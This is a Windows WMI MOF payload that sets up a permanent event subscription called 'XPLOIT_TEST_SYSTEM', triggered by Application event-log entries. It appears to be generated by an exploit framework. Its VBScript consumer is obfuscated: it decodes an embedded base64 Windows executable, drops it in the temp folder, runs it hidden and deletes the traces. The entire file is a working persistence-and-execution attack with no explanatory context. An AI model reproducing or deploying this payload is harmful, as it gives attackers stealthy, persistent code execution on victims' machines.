#pragma namespace ("\\\\.\\root\\subscription")

instance of __EventFilter as $FILTER
{
    Name = "XPLOIT_TEST_SYSTEM";
    EventNamespace = "root\\cimv2";
    Query = "SELECT * FROM __InstanceCreationEvent "
  "WHERE TargetInstance ISA \"Win32_NTLogEvent\" AND "
  "TargetInstance.LogFile=\"Application\"";

    QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as $CONSUMER
{
    Name = "XPLOIT_TEST_SYSTEM";
    ScriptingEngine = "VBScript";

    ScriptText = "Function HcrqPrvygRT(noCKixcfQW)\n"
"	YxcagSQMqdKXTT = \"<B64DECODE xmlns:dt=\"& Chr(34) & \"urn:schemas-microsoft-com:datatypes\" & Chr(34) & \" \" & _\n"
"		\"dt:dt=\" & Chr(34) & \"bin.base64\" & Chr(34) & \">\" & _\n"
"		noCKixcfQW & \"</B64DECODE>\"\n"
"	Set cBaomSndefqVDJ = CreateObject(\"MSXML2.DOMDocument.3.0\")\n"
"	cBaomSndefqVDJ.LoadXML(YxcagSQMqdKXTT)\n"
"	HcrqPrvygRT = cBaomSndefqVDJ.selectsinglenode(\"B64DECODE\").nodeTypedValue\n"
"	set cBaomSndefqVDJ = nothing\n"
"End Function\n"
"\n"
"Function VOwBkZBkpBZxRx()\n"
"	kQgOIDpkLFp = \"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\"\n"
"	Dim DyQZocbgoX\n"
"	Set DyQZocbgoX = CreateObject(\"Scripting.FileSystemObject\")\n"
"	Dim VTQIhxFUIjy\n"
"	Dim LiWyDfctJE\n"
"	Set VTQIhxFUIjy = DyQZocbgoX.GetSpecialFolder(2)\n"
"	LiWyDfctJE = VTQIhxFUIjy & \"\\\" & DyQZocbgoX.GetTempName()\n"
"	DyQZocbgoX.CreateFolder(LiWyDfctJE)\n"
"	dSHjuIKWmOqJ = LiWyDfctJE & \"\\\" & \"fWOBmnOLfa.exe\"\n"
"	Dim ASDpzxKSEa\n"
"	Set ASDpzxKSEa = CreateObject(\"Wscript.Shell\")\n"
"	QLcToRbdBPXli = HcrqPrvygRT(kQgOIDpkLFp)\n"
"	Set nbJupOxk = CreateObject(\"ADODB.Stream\")\n"
"	nbJupOxk.Type = 1\n"
"	nbJupOxk.Open\n"
"	nbJupOxk.Write QLcToRbdBPXli\n"
"	nbJupOxk.SaveToFile dSHjuIKWmOqJ, 2\n"
"	ASDpzxKSEa.run dSHjuIKWmOqJ, 0, true\n"
"	DyQZocbgoX.DeleteFile(dSHjuIKWmOqJ)\n"
"	DyQZocbgoX.DeleteFolder(LiWyDfctJE)\n"
"End Function\n"
"\n"
"VOwBkZBkpBZxRx\n"
"\n"        
};

instance of __FilterToConsumerBinding
{
    Consumer = $CONSUMER ;
    Filter = $FILTER ;
};
